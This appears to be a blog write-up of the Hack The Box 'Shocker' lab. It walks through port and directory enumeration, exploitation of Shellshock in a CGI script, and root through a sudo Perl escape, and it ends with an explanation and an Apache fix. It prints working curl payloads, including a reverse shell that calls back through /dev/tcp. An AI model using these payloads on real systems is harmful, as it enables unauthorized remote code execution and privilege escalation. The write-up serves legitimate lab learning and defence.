---
layout: post
title: HTB Shocker Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/shocker/shocker.png
tags: [HTB, OSCP, EASY]
---

# Notes
![Shocker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/shocker/shocker.png)


| Name | Shocker |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 14 Mar 2017 |
| DIFFICULTY | Easy |

IP:10.10.10.56

# Port Scan

I started with a `nmap` scan on this machine to enumerate open ports.

`nmap -p- --min-rate 1000 10.10.10.56 -oN allPorts.nmap  -v` 
- `-p-` – Scan all ports
- `--min-rate 1000` – Speed up the scan 
- `-oN` – Save the output to a file 
- `-Pn` – Skip host discovery
- `-v` – Verbose (show more output as the scan is running)
```
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Two ports are open 80 & 2222. I then did a script scan on those two ports to get more information about them.
`nmap -p 80,2222 -oN scriptScan.nmap -sVC 10.10.10.56` 
- `-p` – Scan port specified 
- `-oN` – Save the output to a file 
- `-sVC` – Determine service version & run default NSE script

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# 80/TCP HTTP Apache
The first open port is 80 serving an apache web server. The only thing on the home page was this picture 

![Shocker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/shocker/Pasted%20image%2020220914223408.png)

I started with directory brute force as this site was pretty empty. There were a few common directories `cgi-bin`, `icons`, and `server-status`

```
┌─[✗]─[zon@pwn]─[~/htb/shocker]                                                                                                                                                               
└──╼ $feroxbuster -u http://10.10.10.56 -f -n                                                                                                                                                 
                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.3.3                                                                                                                                             
───────────────────────────┬──────────────────────                                                                                                                                            
 🎯  Target Url            │ http://10.10.10.56                                                                                                                                               
 🚀  Threads               │ 50                                                                                                                                                               
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt                                                                                            
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.3.3                                                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                                                               
 🪓  Add Slash             │ true                                                                                                                                                             
 🚫  Do Not Recurse        │ true                                                                                                                                                             
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                                                            
───────────────────────────┴──────────────────────                                                                                                                                            
 🏁  Press [ENTER] to use the Scan Cancel Menu™                                                                                                                                               
──────────────────────────────────────────────────                                                                                                                                            
403       11l       32w      294c http://10.10.10.56/cgi-bin/                                                                                                                                 
403       11l       32w      292c http://10.10.10.56/icons/                                                                                                                                   
403       11l       32w      300c http://10.10.10.56/server-status/                                                                                                                           
[####################] - 36s    29999/29999   0s      found:3       errors:0                                                                                                                  
[####################] - 35s    29999/29999   847/s   http://10.10.10.56                                                                                                                                                                    
```

I next dug into `/cgi-bin` to see if there were any scripts in there. 

```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56/cgi-bin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [sh, cgi, pl]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        7l       17w        0c http://10.10.10.56/cgi-bin/user.sh
```

This machine is named `Shocker` and the picture on the home page was a bug I bet this is vulnerable to CVE-2014-6271, (bash bug or shellshock). To do this I did a simple `curl` request on `/cgi-bin/user.sh` and got code execution!

```
┌─[zon@pwn]─[~/htb/shocker]
└──╼ $curl -H 'User-Agent: () { :; }; echo Content-Type: text/html; echo; /usr/bin/whoami;' http://10.10.10.56/cgi-bin/user.sh
shelly
```

Breakdown of the payload

- `() { :; };` This will define an empty bash function. It is required because shellshock relies on a function being declared before other commands are.
- `echo Content-Type: text/html; echo;` This helps prevent the server from crashing. A properly formatted HTTP response will contain a `Content-Type` header, and a blank line before the body of the repose is displayed
- `/usr/bin/whoami;` The command that we want to execute on the system

From there I can get a shell pretty easy 
```
┌─[zon@pwn]─[~/htb/shocker]
└──╼ $curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/9001 0>&1' http://10.10.10.56/cgi-bin/user.sh
```

Make sure to run `nc -lvnp 9001` before executing the payload above.
```
┌─[zon@pwn]─[~/htb/shocker]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.56] 56654
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

# Root

Running `sudo -l` shows that I can run `/usr/bin/perl` without a password. [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#suid) has an escape for Perl!

```
shelly@Shocker:/usr/lib/cgi-bin$sudo perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
```

# SHELLSCHOCK

The Shellshock vulnerability effects Bash before 4.3. Shellshock occurs when user controlled variables are passed to bash. `Shocker` used the most common exploitation of `/cgi-bin`

### `/cgi-bin`
What is `cgi-bin`? `cgi-bin` is a folder used to store scripts that will interact with a Web browser to give the site functionality. An example would be visualization for user experience. `Shocker` uses `user.sh` to show the uptime of the server. Script files in `/cgi-bin` can be written in any language understood by the server (perl, python, bash, etc), on this machine it was bash

### Headers & Variables 
The normal HTTP request to `/cgi-bin/user.sh` looked like:
```
GET /cgi-bin/user.sh HTTP/1.1

Host: 10.10.10.56

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

DNT: 1

Connection: close

Upgrade-Insecure-Requests: 1
```

The Response would be the server replying with the output of `user.sh`
```
HTTP/1.1 200 OK

Date: Thu, 15 Sep 2022 17:49:34 GMT

Server: Apache/2.4.18 (Ubuntu)

Connection: close

Content-Type: text/x-sh

Content-Length: 117



Content-Type: text/plain

Just an uptime test script

 13:49:34 up 12:56,  1 user,  load average: 0.00, 0.00, 0.00
```

Inside the HTTP request, we can see that we are requesting `/cgi-bin/user.sh` and have sent some headers to the server. These headers provide the web server with information about my browser like, my language, what browser I'm using, the site I want, etc. When these headers are processed by the web server they are turned into environment variables. The web server does this so it can respond with the right response, it will make sure it is in English and its the right page. 

Shellshock occurs when these variables are passed into bash. In `Shocker` we did this by chaining the User-Agent header 

- Before `User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0`  
- After `User-Agent: () { :; }; echo Content-Type: text/html; echo; /usr/bin/whoami;`. 

This created the environment variable `HTTP_USER_AGENT=() { :; }; echo Content-Type: text/html; echo; /usr/bin/whoami;` inside the web server. That variable was then passed into bash and executed!

Shellshock is is a vulnerability in `bash` not apache2. Any service that takes user input and inserts it into a BASH environment variable on a vulnerable version of bash is vulnerable. 


### FIX
The best fix for this is to simply update `bash`, but in cases where this cant happen disable shell callout in `/cgi-bin`.

To do this edit `/etc/apache2/apache2.conf` and add the following line to the bottom. 
```
<Directory "/usr/lib/cgi-bin">
    Require all denied
</Directory>
```

Restart the service `sudo systemctl restart apache2` and then trying the exploit again it fails
```
┌─[zon@pwn]─[~/htb/shocker]
└──╼ $curl -H 'User-Agent: () { :; }; echo Content-Type: text/html; echo; /usr/bin/whoami;' http://10.10.10.56/cgi-bin/user.sh
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /cgi-bin/user.sh
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>
```
